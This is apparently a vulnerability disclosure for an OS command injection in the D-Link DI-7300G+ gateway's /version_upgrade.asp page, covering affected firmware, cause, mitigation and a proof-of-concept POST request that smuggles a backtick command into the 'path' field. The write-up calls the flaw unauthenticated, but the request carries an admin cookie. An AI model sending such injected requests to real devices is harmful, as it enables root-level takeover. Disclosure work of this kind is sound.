
# Information


**Vendor of the products:**  D-Link

**Vendor's website:** https://www.dlink.com.cn/

**Affected products:**  DI_7300G+V2

**Affected firmware version:** V 19.12.25A1

**Firmware download address:** [D-Link Technical Support](https://www.dlink.com.cn/techsupport/download.ashx?file=7772)

**Submitter:** Yun Zhang @DavCloudz


# Overview

A critical remote os command execution vulnerability has been identified in the D-Link DI-7300G+ enterprise gateway. The vulnerability exists in the /version_upgrade.asp endpoint. This flaw allows an unauthenticated remote attacker to execute arbitrary operating system commands on the underlying system with elevated privileges.

The vulnerability arises due to insufficient input validation and sanitization of user-supplied data within the HTTP POST request handler for the version_upgrade.asp page. By crafting a malicious POST request containing shell metacharacters and arbitrary commands, an attacker can bypass intended security restrictions. The injected commands are subsequently executed by the device's operating system with root or system-level permissions.

# Vulnerability details

The API for invoking the function

<img width="865" height="599" alt="image" src="https://github.com/user-attachments/assets/df83cf0b-d50a-4d9a-8936-dc7d36eccc21" />


You can see that the values of patch and type are taken, but when the type is empty, it will enter the else branch and stitch the value of patch into the system implementation command to execute

<img width="865" height="732" alt="image" src="https://github.com/user-attachments/assets/d4e3c370-a31b-45c3-944b-0fdb530ad943" />


Although there is filtering, there is still command injection because the filtering is not strict

<img width="865" height="135" alt="image" src="https://github.com/user-attachments/assets/8d9b7ddc-21bd-479c-800e-70463228f00f" />


# POC

```
POST /version_upgrade.asp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A98
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

path=`ls>/pwn.txt`
```

<img width="865" height="492" alt="image" src="https://github.com/user-attachments/assets/035bfa97-59ae-4a05-b92b-8f868b131bb5" />


# Solution/Mitigation
**Vendor Fix:** Users are strongly advised to upgrade to the latest available firmware version for the DI-7300G+ model. Please check the official D-Link support website for patches and updates.

**Workaround:** If immediate patching is not possible, it is recommended to restrict network access to the web management interface of the device, ensuring it is not exposed to untrusted networks such as the public internet.
